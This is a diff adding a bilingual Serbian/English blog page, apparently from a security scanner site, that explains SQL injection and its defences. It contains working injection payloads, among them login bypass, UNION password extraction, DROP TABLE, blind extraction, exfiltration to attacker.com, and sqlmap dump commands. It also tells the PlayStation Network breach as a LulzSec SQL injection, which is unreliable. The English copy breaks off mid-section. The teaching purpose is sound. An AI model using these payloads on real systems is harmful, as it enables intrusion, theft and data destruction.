@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="sr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL Injection — Objasnjenje i zastita | Web Security Scanner</title>
+  <meta name="description" content="Kompletni vodic za SQL Injection napade: kako radi, tipovi (Classic, Blind, Out-of-band), realni primeri (Equifax, Sony), i zastita sa prepared statements, ORM i WAF.">
+  <meta name="keywords" content="SQL injection, SQLi, baze podataka, prepared statements, bezbednost, parameterized queries, ORM, OWASP">
+  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
+  <link rel="canonical" href="https://security-scanner-ruddy.vercel.app/blog-security-sql.html">
+  <link rel="alternate" hreflang="sr" href="https://security-scanner-ruddy.vercel.app/blog-security-sql.html">
+  <link rel="alternate" hreflang="en" href="https://security-scanner-ruddy.vercel.app/blog-security-sql.html">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="SQL Injection — Objasnjenje i zastita od SQLi napada">
+  <meta property="og:description" content="Naucite sve o SQL Injection napadima: kako funkcionisu, tipovi, realni primeri i kako da zastitite vasu aplikaciju sa prepared statements.">
+  <meta property="og:url" content="https://security-scanner-ruddy.vercel.app/blog-security-sql.html">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="SQL Injection — Objasnjenje i zastita od SQLi napada">
+  <meta name="twitter:description" content="Naucite sve o SQL Injection napadima: kako funkcionisu, tipovi, realni primeri i zastita.">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "SQL Injection — Objasnjenje i zastita od SQLi napada",
+    "author": {"@type": "Person", "name": "Toske", "url": "https://toske-programer.web.app"},
+    "publisher": {"@type": "Organization", "name": "Web Security Scanner"},
+    "datePublished": "2026-04-09",
+    "dateModified": "2026-04-09",
+    "description": "Kompletni vodic za SQL Injection: tipovi napada, realni primeri, prepared statements, ORM i WAF zastita.",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https://security-scanner-ruddy.vercel.app/blog-security-sql.html"
+    }
+  }
+  </script>
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "FAQPage",
+    "mainEntity": [
+      {
+        "@type": "Question",
+        "name": "Sta je SQL Injection?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "SQL Injection (SQLi) je tip web napada gde napadac ubacuje maliciozan SQL kod kroz korisnicki unos (forme, URL parametre) koji se direktno koristi u SQL upitima. Ovo omogucava napadacu da cita, modifikuje ili brise podatke iz baze, zaobidje autentifikaciju, ili cak izvrsi komande na operativnom sistemu servera."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Kako se zastititi od SQL Injection-a?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Najefektivnija zastita je koriscenje prepared statements (parameterized queries) gde se korisnicki unos tretira iskljucivo kao podatak, a ne kao deo SQL koda. Dodatne mere ukljucuju ORM alate, input validaciju, princip najmanje privilegije za DB korisnike i Web Application Firewall (WAF)."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Koji su najpoznatiji SQL Injection napadi?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Najpoznatiji primeri ukljucuju: Heartland Payment Systems (2008) — 130 miliona ukradenih kartica, Sony Pictures (2011) — 77 miliona kompromitovanih naloga, i Equifax (2017) — 147 miliona pogodjenjih korisnika sa kaznom od 700 miliona dolara. SQL Injection je bio uzrok vecine najvecih kradzja podataka u istoriji."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Da li ORM stiti od SQL Injection-a?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Da, ORM alati kao Django ORM, SQLAlchemy, Prisma i Sequelize automatski koriste parameterized queries, sto pruza zastitu od SQL Injection-a. Medjutim, vecina ORM-ova dozvoljava pisanje sirovih SQL upita (raw queries) gde morate sami koristiti parameterizaciju. Takodje, neispravna konfiguracija ORM-a moze dovesti do ranjivosti."
+        }
+      }
+    ]
+  }
+  </script>
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "HowTo",
+    "name": "Kako zastititi aplikaciju od SQL Injection-a",
+    "step": [
+      {
+        "@type": "HowToStep",
+        "name": "Koristite prepared statements",
+        "text": "Zamenite sve string konkatenacije u SQL upitima sa prepared statements / parameterized queries. U PHP koristite PDO, u Node.js pg-promise ili mysql2, u Python sqlite3.execute sa placeholder-ima."
+      },
+      {
+        "@type": "HowToStep",
+        "name": "Implementirajte ORM",
+        "text": "Koristite ORM alate (Django ORM, SQLAlchemy, Prisma, Sequelize) umesto sirovih SQL upita. ORM automatski parametrizuje upite."
+      },
+      {
+        "@type": "HowToStep",
+        "name": "Primenite princip najmanje privilegije",
+        "text": "Kreirajte odvojene DB korisnike za citanje i pisanje. Web aplikacija nikada ne treba da koristi root/admin DB nalog."
+      },
+      {
+        "@type": "HowToStep",
+        "name": "Testirajte sa SQLMap",
+        "text": "Koristite SQLMap (automatski SQL injection alat) za testiranje vase aplikacije. Pokrenite: sqlmap -u 'https://vasajt.com/page?id=1' --batch"
+      }
+    ]
+  }
+  </script>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%236c63ff' stroke-width='2.5' stroke-linecap='round'><path d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/></svg>">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="./blog-common.css">
+</head>
+<body>
+<div class="blog-layout">
+  <aside class="timeline-nav">
+    <div class="sr"><div class="timeline-title">Sadrzaj</div><ol id="timeline-sr"></ol></div>
+    <div class="en"><div class="timeline-title">Contents</div><ol id="timeline-en"></ol></div>
+  </aside>
+  <main class="blog-content">
+
+  <!-- ==================== SR CONTENT ==================== -->
+  <div class="sr">
+    <h1>SQL Injection — Objasnjenje i zastita</h1>
+    <p class="subtitle">Kompletni vodic za SQL Injection napade: kako funkcionisu, tipovi, realni primeri i detaljne mere zastite</p>
+
+    <div class="stat-grid">
+      <div class="stat-card">
+        <div class="stat-num">#3</div>
+        <div class="stat-label">OWASP Top 10 (2021)</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num">$700M</div>
+        <div class="stat-label">Equifax kazna (2017)</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num">147M</div>
+        <div class="stat-label">Pogodjena lica (Equifax)</div>
+      </div>
+    </div>
+
+    <div class="toc">
+      <h3>Sadrzaj</h3>
+      <ol>
+        <li><a href="#sql-sta">Sta je SQL Injection</a></li>
+        <li><a href="#sql-kako">Kako SQL Injection radi — korak po korak</a></li>
+        <li><a href="#sql-tipovi">Tipovi SQL Injection napada</a></li>
+        <li><a href="#sql-primeri">Realni primeri napada</a></li>
+        <li><a href="#sql-posledice">Posledice SQL Injection-a</a></li>
+        <li><a href="#sql-prepared">Zastita: Prepared Statements</a></li>
+        <li><a href="#sql-orm">Zastita: ORM alati</a></li>
+        <li><a href="#sql-validacija">Zastita: Input validacija i Least Privilege</a></li>
+        <li><a href="#sql-waf">Zastita: WAF i testiranje</a></li>
+        <li><a href="#sql-reference">Reference i resursi</a></li>
+      </ol>
+    </div>
+
+    <h2 id="sql-sta">1. Sta je SQL Injection</h2>
+    <p>SQL Injection (SQLi) je tip napada gde napadac ubacuje maliciozan SQL kod kroz korisnicki unos koji se direktno koristi u SQL upitima bez adekvatne sanitizacije. Ovo je jedna od najstarijih, ali i dalje najcescih i najopasnijih web ranjivosti.</p>
+    <p>SQL Injection je klasifikovan kao <a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank">CWE-89: Improper Neutralization of Special Elements used in an SQL Command</a>. U OWASP Top 10 2021, SQL Injection spada pod kategoriju <strong>A03:2021 — Injection</strong> (zajedno sa OS command injection, LDAP injection i drugima).</p>
+    <p>Prema Akamai izvestaju, SQL Injection napadi cine oko 65% svih napada na web aplikacije. Uprkos tome sto zastita postoji vec decenijama (prepared statements su dostupni od 1990-ih), ovaj napad ostaje dominantan zbog nastavka prakse konkatenacije SQL upita.</p>
+
+    <div class="callout callout-danger">
+      <strong>Koliko je cest:</strong> Prema Verizon Data Breach Investigations Report-u (DBIR), SQL Injection je bio uzrok ili faktor u oko 25% svih povreda podataka u periodu 2015-2022.
+    </div>
+
+    <h2 id="sql-kako">2. Kako SQL Injection radi — korak po korak</h2>
+
+    <h3>Primer: Login forma</h3>
+    <p>Zamislite login formu gde korisnik unosi username i password. Server koristi te podatke da napravi SQL upit:</p>
+    <pre><code>// Ranjiv PHP kod
+$username = $_POST['username'];
+$password = $_POST['password'];
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$result = mysqli_query($conn, $query);</code></pre>
+
+    <h3>Korak 1: Normalan login</h3>
+    <pre><code>// Korisnik unosi: username = "marko", password = "tajno123"
+// Generisani SQL upit:
+SELECT * FROM users WHERE username = 'marko' AND password = 'tajno123'
+// Rezultat: vraca Markov nalog ako podaci odgovaraju</code></pre>
+
+    <h3>Korak 2: SQL Injection napad</h3>
+    <pre><code>// Napadac unosi: username = "admin' --", password = "bilo_sta"
+// Generisani SQL upit:
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'bilo_sta'
+// "--" je SQL komentar — sve posle toga se ignorise!
+// Efektivni upit:
+SELECT * FROM users WHERE username = 'admin'
+// Rezultat: napadac se uloguje kao admin BEZ lozinke!</code></pre>
+
+    <h3>Korak 3: Napredni napad — izvlacenje podataka</h3>
+    <pre><code>// Napadac unosi: username = "' UNION SELECT username, password FROM users --"
+// Generisani upit:
+SELECT * FROM users WHERE username = '' UNION SELECT username, password FROM users --'
+// UNION kombinuje rezultate — napadac dobija sve korisnike i lozinke!</code></pre>
+
+    <h3>Korak 4: Destruktivan napad</h3>
+    <pre><code>// Napadac unosi: username = "'; DROP TABLE users; --"
+// Generisani upit:
+SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
+// Rezultat: CELA tabela korisnika je obrisana!</code></pre>
+
+    <div class="callout callout-danger">
+      <strong>VAZNO:</strong> Ovi primeri su iskljucivo u edukativne svrhe. Izvodjenje SQL Injection napada na sisteme bez ovlascenja je krivicno delo po Zakonu o racunarskoj bezbednosti.
+    </div>
+
+    <h2 id="sql-tipovi">3. Tipovi SQL Injection napada</h2>
+    <table>
+      <tr><th>Tip</th><th>Opis</th><th>Tezina detekcije</th><th>Opasnost</th></tr>
+      <tr><td>Classic (In-band)</td><td>Rezultat napada je vidljiv na stranici</td><td>Laka</td><td>Visoka</td></tr>
+      <tr><td>Error-based</td><td>Koristi SQL error poruke za izvlacenje podataka</td><td>Laka</td><td>Visoka</td></tr>
+      <tr><td>UNION-based</td><td>Koristi UNION operator za kombinovanje upita</td><td>Srednja</td><td>Visoka</td></tr>
+      <tr><td>Blind Boolean</td><td>Saznaje podatke kroz true/false odgovore</td><td>Teska</td><td>Visoka</td></tr>
+      <tr><td>Blind Time-based</td><td>Koristi SLEEP/WAITFOR za detekciju</td><td>Teska</td><td>Visoka</td></tr>
+      <tr><td>Out-of-Band</td><td>Podaci se salju na napadacev server (DNS, HTTP)</td><td>Vrlo teska</td><td>Visoka</td></tr>
+    </table>
+
+    <h3>Classic (In-band) SQL Injection</h3>
+    <p>Najjednostavniji tip — napadac vidi rezultate upita direktno na stranici. Ukljucuje Error-based (koriscenje SQL gresaka) i UNION-based (kombinovanje rezultata).</p>
+    <pre><code>// Error-based — izvlacenje verzije baze
+' AND 1=CONVERT(int, @@version) --
+// Error: Conversion failed... "Microsoft SQL Server 2019..."
+
+// UNION-based — izvlacenje tabela
+' UNION SELECT table_name, NULL FROM information_schema.tables --</code></pre>
+
+    <h3>Blind SQL Injection — Boolean-based</h3>
+    <p>Kada server ne prikazuje SQL greske, napadac saznaje podatke postavljajuci true/false pitanja:</p>
+    <pre><code>// Da li prvi karakter admin lozinke je 'a'?
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --
+// Ako stranica radi normalno = TRUE (karakter je 'a')
+// Ako stranica prikazuje gresku = FALSE (karakter nije 'a')
+
+// Napadac ponavlja za svaki karakter — sporo ali efektivno
+// Automatizcija: SQLMap automatski radi ovo</code></pre>
+
+    <h3>Blind SQL Injection — Time-based</h3>
+    <p>Kada server ne daje nikakvu razliku u odgovoru, napadac koristi kasnjenje (delay) za detekciju:</p>
+    <pre><code>// MySQL
+' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0) --
+// Ako odgovor kasni 5 sekundi = TRUE
+// Ako je odgovor odmah = FALSE
+
+// SQL Server
+'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' WAITFOR DELAY '00:00:05' --
+
+// PostgreSQL
+'; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END --</code></pre>
+
+    <h3>Out-of-Band SQL Injection</h3>
+    <p>Podaci se salju na napadacev server putem DNS ili HTTP zahteva. Koristi se kada in-band i blind metode ne rade:</p>
+    <pre><code>// SQL Server — DNS exfiltration
+'; EXEC xp_dirtree '\\attacker.com\' + (SELECT TOP 1 password FROM users) --
+
+// MySQL — HTTP exfiltration (ako je omoguceno)
+' UNION SELECT LOAD_FILE(CONCAT('\\\\attacker.com\\', (SELECT password FROM users LIMIT 1))) --</code></pre>
+
+    <h2 id="sql-primeri">4. Realni primeri napada</h2>
+
+    <h3>Heartland Payment Systems (2008)</h3>
+    <p>Albert Gonzalez i njegov tim su koristili SQL Injection da kompromituju Heartland Payment Systems, jedan od najvecih procesora karticnih transakcija u SAD-u. Napad je rezultirao kradjom <strong>130 miliona</strong> brojeva kreditnih i debitnih kartica — u tom trenutku najveca kradja podataka u istoriji. Gonzalez je osudjen na 20 godina zatvora.</p>
+
+    <h3>Sony Pictures (2011)</h3>
+    <p>Hakerska grupa LulzSec je iskoristila SQL Injection ranjivost na Sony Pictures sajtu i kompromitovala <strong>77 miliona</strong> korisnickih naloga na PlayStation Network-u. Podaci su ukljucivali imena, adrese, email adrese i lozinke (koje su bile cuvane u plain text-u, bez hashiranja). Sony je morao da ugasi PSN na 23 dana i procenjena steta je bila preko 171 milion dolara.</p>
+
+    <h3>Equifax (2017)</h3>
+    <p>Mada Equifax napad je primarno koristio Apache Struts ranjivost (CVE-2017-5638), SQL Injection je bio deo lanca napada za izvlacenje podataka. Kompromitovano je <strong>147 miliona</strong> korisnickih zapisa ukljucujuci Social Security brojeve, datume rodjenja i adrese. Equifax je platio <strong>$700 miliona</strong> u nagodbi sa FTC-om, sto je najveca kazna za krsenje podataka u istoriji SAD-a.</p>
+
+    <h3>TalkTalk (2015)</h3>
+    <p>Britanski telekom provajder TalkTalk je hakovan putem SQL Injection-a. Kompromitovano je <strong>157,000</strong> korisnickih naloga. TalkTalk je kaznjen sa 400,000 funti od strane ICO. Interesantno, napadac je bio 17-godisnjak.</p>
+
+    <h3>7-Eleven Japan (2019)</h3>
+    <p>Napadaci su koristili SQL Injection za pristup sistemu 7pay mobilnog placanja. Kompromitovano je 900 naloga sa ukupnom kradjom od oko 500,000 dolara. 7-Eleven je morao da ugasi ceo servis.</p>
+
+    <h2 id="sql-posledice">5. Posledice SQL Injection-a</h2>
+    <ul>
+      <li><strong>Neovlascen pristup bazi</strong> — Citanje svih tabela, ukljucujuci korisnicke podatke, lozinke, finansijske informacije</li>
+      <li><strong>Modifikacija podataka</strong> — Promena cena, izmena korisnickih naloga, dodavanje admin pristupa</li>
+      <li><strong>Brisanje podataka</strong> — DROP TABLE, DELETE FROM — potpuni gubitak podataka</li>
+      <li><strong>Privilege escalation</strong> — Dodavanje admin naloga, dobijanje pristupa koji ne bi trebalo da imate</li>
+      <li><strong>OS command execution</strong> — Na nekim DB sistemima (SQL Server sa xp_cmdshell) napadac moze da izvrsi komande na serveru</li>
+      <li><strong>Lateralni pokret</strong> — Koriscenje DB servera kao odskocne tacke za napad na interne sisteme</li>
+      <li><strong>Finansijska steta</strong> — Kazne (GDPR, FTC), sudski troskovi, gubitak klijenata</li>
+      <li><strong>Reputaciona steta</strong> — Gubitak poverenja korisnika i poslovnih partnera</li>
+    </ul>
+
+    <h2 id="sql-prepared">6. Zastita: Prepared Statements (Parameterized Queries)</h2>
+    <p>Prepared statements su <strong>najefektivnija</strong> zastita od SQL Injection-a. Princip je jednostavan: odvojite SQL kod od podataka. Baza podataka tretira parametre iskljucivo kao vrednosti, nikada kao deo SQL koda.</p>
+
+    <h3>PHP — PDO</h3>
+    <pre><code>// RANJIVO — konkatenacija
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+
+// BEZBEDNO — PDO prepared statement
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
+$stmt->execute([
+    ':username' => $username,
+    ':password' => $password
+]);
+$user = $stmt->fetch();</code></pre>
+
+    <h3>Python — sqlite3 / psycopg2</h3>
+    <pre><code># RANJIVO
+cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
+
+# BEZBEDNO — parametrizovani upit
+cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
+
+# SQLAlchemy
+from sqlalchemy import text
+result = db.execute(text("SELECT * FROM users WHERE username = :name"), {"name": username})</code></pre>
+
+    <h3>Java — JDBC</h3>
+    <pre><code>// RANJIVO
+String query = "SELECT * FROM users WHERE username = '" + username + "'";
+Statement stmt = conn.createStatement();
+ResultSet rs = stmt.executeQuery(query);
+
+// BEZBEDNO — PreparedStatement
+String query = "SELECT * FROM users WHERE username = ? AND password = ?";
+PreparedStatement stmt = conn.prepareStatement(query);
+stmt.setString(1, username);
+stmt.setString(2, password);
+ResultSet rs = stmt.executeQuery();</code></pre>
+
+    <h3>Node.js — mysql2 / pg</h3>
+    <pre><code>// RANJIVO
+const query = `SELECT * FROM users WHERE username = '${username}'`;
+connection.query(query);
+
+// BEZBEDNO — mysql2
+const [rows] = await connection.execute(
+  'SELECT * FROM users WHERE username = ? AND password = ?',
+  [username, password]
+);
+
+// BEZBEDNO — pg (PostgreSQL)
+const result = await pool.query(
+  'SELECT * FROM users WHERE username = $1 AND password = $2',
+  [username, password]
+);</code></pre>
+
+    <h3>C# — ADO.NET</h3>
+    <pre><code>// RANJIVO
+string query = "SELECT * FROM users WHERE username = '" + username + "'";
+SqlCommand cmd = new SqlCommand(query, conn);
+
+// BEZBEDNO — SqlParameter
+string query = "SELECT * FROM users WHERE username = @username AND password = @password";
+SqlCommand cmd = new SqlCommand(query, conn);
+cmd.Parameters.AddWithValue("@username", username);
+cmd.Parameters.AddWithValue("@password", password);</code></pre>
+
+    <div class="callout">
+      <strong>Zasto prepared statements rade:</strong> Baza podataka kompajlira SQL upit BEZ korisnickih podataka, kreirajuci fiksni plan izvrsavanja. Zatim se korisnicki podaci salju odvojeno kao parametri. Cak i ako parametar sadrzi <code>' OR 1=1 --</code>, baza ga tretira kao literal string, ne kao SQL kod.
+    </div>
+
+    <h2 id="sql-orm">7. Zastita: ORM alati</h2>
+    <p>Object-Relational Mapping (ORM) alati automatski generisu parametrizovane SQL upite, pruzajuci zastitu od SQL Injection-a uz bolju produktivnost razvoja.</p>
+
+    <h3>Django ORM (Python)</h3>
+    <pre><code># BEZBEDNO — Django ORM automatski parametrizuje
+user = User.objects.filter(username=username, password=password).first()
+
+# Takodje bezbedno — lookups
+users = User.objects.filter(email__contains=search_term)
+
+# OPASNO — raw query bez parametrizacije
+User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'"  )  # NE!
+
+# BEZBEDNO — raw query SA parametrizacijom
+User.objects.raw("SELECT * FROM users WHERE username = %s", [username])</code></pre>
+
+    <h3>SQLAlchemy (Python)</h3>
+    <pre><code>from sqlalchemy import select
+from models import User
+
+# BEZBEDNO — SQLAlchemy query builder
+stmt = select(User).where(User.username == username)
+result = session.execute(stmt).first()</code></pre>
+
+    <h3>Prisma (Node.js / TypeScript)</h3>
+    <pre><code>// BEZBEDNO — Prisma automatski parametrizuje
+const user = await prisma.user.findUnique({
+  where: {
+    username: username,
+  },
+});
+
+// BEZBEDNO — findMany sa filterima
+const users = await prisma.user.findMany({
+  where: {
+    email: { contains: searchTerm },
+  },
+});</code></pre>
+
+    <h3>Sequelize (Node.js)</h3>
+    <pre><code>// BEZBEDNO — Sequelize model query
+const user = await User.findOne({
+  where: { username: username, password: password }
+});
+
+// OPASNO — raw query
+sequelize.query(`SELECT * FROM users WHERE username = '${username}'`); // NE!
+
+// BEZBEDNO — raw query sa parametrima
+sequelize.query('SELECT * FROM users WHERE username = ?', {
+  replacements: [username],
+  type: QueryTypes.SELECT
+});</code></pre>
+
+    <h2 id="sql-validacija">8. Zastita: Input validacija i Least Privilege</h2>
+
+    <h3>Input validacija (dodatni sloj)</h3>
+    <p>Input validacija <strong>nije</strong> zamena za prepared statements, ali je koristan dodatni sloj zastite:</p>
+    <pre><code>// Whitelist za numericke ID-jeve
+function validateId(input) {
+  var id = parseInt(input, 10);
+  if (isNaN(id) || id < 1) throw new Error('Invalid ID');
+  return id;
+}
+
+// Whitelist za sort kolone
+var allowedColumns = ['name', 'email', 'created_at'];
+function validateSortColumn(input) {
+  if (!allowedColumns.includes(input)) throw new Error('Invalid column');
+  return input;
+}
+
+// Whitelist za sort smer
+function validateSortOrder(input) {
+  return input === 'DESC' ? 'DESC' : 'ASC';
+}</code></pre>
+
+    <h3>Princip najmanje privilegije (Least Privilege)</h3>
+    <p>Kreirajte odvojene DB korisnike sa minimalnim privilegijama:</p>
+    <pre><code>-- Korisnik za citanje (web aplikacija - vecina upita)
+CREATE USER 'app_readonly'@'localhost' IDENTIFIED BY 'strong_password';
+GRANT SELECT ON mydb.* TO 'app_readonly'@'localhost';
+
+-- Korisnik za pisanje (kada je potrebno)
+CREATE USER 'app_write'@'localhost' IDENTIFIED BY 'strong_password';
+GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'app_write'@'localhost';
+-- NAPOMENA: Nema DELETE, DROP, ALTER privilegija!
+
+-- Nikada ne koristite root nalog za web aplikaciju!
+-- Nikada ne dodeljujte: DROP, ALTER, GRANT, FILE, PROCESS, SUPER</code></pre>
+
+    <h3>Stored procedure (oprezno)</h3>
+    <pre><code>-- Stored procedure moze pomoci, ali MORA koristiti parametre
+CREATE PROCEDURE GetUser(IN p_username VARCHAR(50))
+BEGIN
+    SELECT * FROM users WHERE username = p_username;
+    -- p_username je parametrizovan — bezbedan
+END;
+
+-- OPASNO — dinamicki SQL u proceduri
+CREATE PROCEDURE UnsafeSearch(IN p_term VARCHAR(100))
+BEGIN
+    SET @query = CONCAT('SELECT * FROM products WHERE name LIKE ''%', p_term, '%''');
+    PREPARE stmt FROM @query;
+    EXECUTE stmt;  -- Ranjivo na SQL Injection!
+END;</code></pre>
+
+    <h2 id="sql-waf">9. Zastita: WAF i testiranje</h2>
+
+    <h3>Web Application Firewall (WAF)</h3>
+    <p>WAF je dodatni sloj zastite koji analizira HTTP zahteve i blokira sumnjive SQL Injection pokusaje. Popularne opcije:</p>
+    <ul>
+      <li><strong>ModSecurity</strong> — Open-source WAF za Apache, Nginx i IIS. OWASP Core Rule Set (CRS) ukljucuje pravila za SQL Injection detekciju.</li>
+      <li><strong>Cloudflare WAF</strong> — Cloud-based WAF sa ugradjenim pravilima za SQLi.</li>
+      <li><strong>AWS WAF</strong> — Amazon-ov WAF sa managed rule group-ama za SQL Injection.</li>
+      <li><strong>Imperva</strong> — Enterprise WAF sa naprednom SQLi zastitom.</li>
+    </ul>
+
+    <div class="callout callout-warn">
+      <strong>WAF nije zamena za prepared statements!</strong> WAF moze biti zaobidjen sa dovoljno sofisticiranim payload-om (encoding, komentari, alternativna sintaksa). Koristite WAF kao dodatni sloj, ne kao primarnu zastitu.
+    </div>
+
+    <h3>Testiranje sa SQLMap</h3>
+    <p><a href="https://sqlmap.org/" target="_blank">SQLMap</a> je open-source alat za automatsko testiranje i eksploataciju SQL Injection ranjivosti. Koristite ga za testiranje vasih sopstvenih aplikacija:</p>
+    <pre><code># Osnovno testiranje
+sqlmap -u "https://vasajt.com/page?id=1" --batch
+
+# Testiranje POST parametara
+sqlmap -u "https://vasajt.com/login" --data="username=test&password=test" --batch
+
+# Enumeracija baza podataka
+sqlmap -u "https://vasajt.com/page?id=1" --dbs --batch
+
+# Enumeracija tabela
+sqlmap -u "https://vasajt.com/page?id=1" -D mydb --tables --batch
+
+# Dump podataka (SAMO na sopstvenom sistemu!)
+sqlmap -u "https://vasajt.com/page?id=1" -D mydb -T users --dump --batch</code></pre>
+
+    <h3>Drugi alati za testiranje</h3>
+    <ul>
+      <li><strong>OWASP ZAP</strong> — Open-source web security skener sa SQL Injection detekcijom</li>
+      <li><strong>Burp Suite</strong> — Profesionalni alat za web security testiranje</li>
+      <li><strong>Havij</strong> — Automatizcani SQL Injection alat (samo za autorizovano testiranje)</li>
+      <li><strong>jSQL Injection</strong> — Java-baziran SQLi alat</li>
+    </ul>
+
+    <h2 id="sql-reference">10. Reference i resursi</h2>
+    <ul>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank">OWASP SQL Injection Prevention Cheat Sheet</a> — Kompletni vodic za zastitu</li>
+      <li><a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank">OWASP Top 10 — A03:2021 Injection</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank">CWE-89: SQL Injection</a></li>
+      <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger — SQL Injection</a> — Interaktivne laboratorije za vezbanje</li>
+      <li><a href="https://sqlmap.org/" target="_blank">SQLMap</a> — Automatski SQL Injection alat</li>
+      <li><a href="https://www.acunetix.com/websitesecurity/sql-injection/" target="_blank">Acunetix — SQL Injection vodic</a></li>
+      <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection" target="_blank">OWASP Testing Guide — SQL Injection</a></li>
+      <li><a href="https://developer.mozilla.org/en-US/docs/Glossary/SQL_Injection" target="_blank">MDN — SQL Injection</a></li>
+    </ul>
+
+    <a href="./index.html" class="cta">Skenirajte bezbednost vaseg sajta</a>
+  </div>
+
+  <!-- ==================== EN CONTENT ==================== -->
+  <div class="en">
+    <h1>SQL Injection — Explanation and Protection</h1>
+    <p class="subtitle">Complete guide to SQL Injection attacks: how they work, types, real-world examples, and detailed protection measures</p>
+
+    <div class="stat-grid">
+      <div class="stat-card">
+        <div class="stat-num">#3</div>
+        <div class="stat-label">OWASP Top 10 (2021)</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num">$700M</div>
+        <div class="stat-label">Equifax fine (2017)</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num">147M</div>
+        <div class="stat-label">Affected individuals (Equifax)</div>
+      </div>
+    </div>
+
+    <div class="toc">
+      <h3>Table of Contents</h3>
+      <ol>
+        <li><a href="#sql-sta">What is SQL Injection</a></li>
+        <li><a href="#sql-kako">How SQL Injection works — step by step</a></li>
+        <li><a href="#sql-tipovi">Types of SQL Injection attacks</a></li>
+        <li><a href="#sql-primeri">Real-world attack examples</a></li>
+        <li><a href="#sql-posledice">Consequences of SQL Injection</a></li>
+        <li><a href="#sql-prepared">Protection: Prepared Statements</a></li>
+        <li><a href="#sql-orm">Protection: ORM tools</a></li>
+        <li><a href="#sql-validacija">Protection: Input validation and Least Privilege</a></li>
+        <li><a href="#sql-waf">Protection: WAF and testing</a></li>
+        <li><a href="#sql-reference">References and resources</a></li>
+      </ol>
+    </div>
+
+    <h2 id="sql-what">1. What is SQL Injection</h2>
+    <p>SQL Injection (SQLi) is a type of attack where an attacker injects malicious SQL code through user input that is directly used in SQL queries without adequate sanitization. It is one of the oldest, yet still most common and dangerous web vulnerabilities.</p>
+    <p>SQL Injection is classified as <a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank">CWE-89: Improper Neutralization of Special Elements used in an SQL Command</a>. In OWASP Top 10 2021, SQL Injection falls under category <strong>A03:2021 — Injection</strong> (along with OS command injection, LDAP injection, and others).</p>
+    <p>According to the Akamai report, SQL Injection attacks constitute about 65% of all web application attacks. Despite the fact that protection has existed for decades (prepared statements have been available since the 1990s), this attack remains dominant due to the continued practice of SQL query concatenation.</p>
+
+    <div class="callout callout-danger">
+      <strong>How common:</strong> According to the Verizon Data Breach Investigations Report (DBIR), SQL Injection was the cause or factor in about 25% of all data breaches in the 2015-2022 period.
+    </div>
+
+    <h2 id="sql-how">2. How SQL Injection works — step by step</h2>
+
+    <h3>Example: Login form</h3>
+    <p>Imagine a login form where the user enters a username and password. The server uses this data to create an SQL query:</p>
+    <pre><code>// Vulnerable PHP code
+$username = $_POST['username'];
+$password = $_POST['password'];
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$result = mysqli_query($conn, $query);</code></pre>
+
+    <h3>Step 1: Normal login</h3>
+    <pre><code>// User enters: username = "marko", password = "secret123"
+// Generated SQL query:
+SELECT * FROM users WHERE username = 'marko' AND password = 'secret123'
+// Result: returns Marko's account if credentials match</code></pre>
+
+    <h3>Step 2: SQL Injection attack</h3>
+    <pre><code>// Attacker enters: username = "admin' --", password = "anything"
+// Generated SQL query:
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
+// "--" is an SQL comment — everything after it is ignored!
+// Effective query:
+SELECT * FROM users WHERE username = 'admin'
+// Result: attacker logs in as admin WITHOUT a password!</code></pre>
+
+    <h3>Step 3: Advanced attack — data extraction</h3>
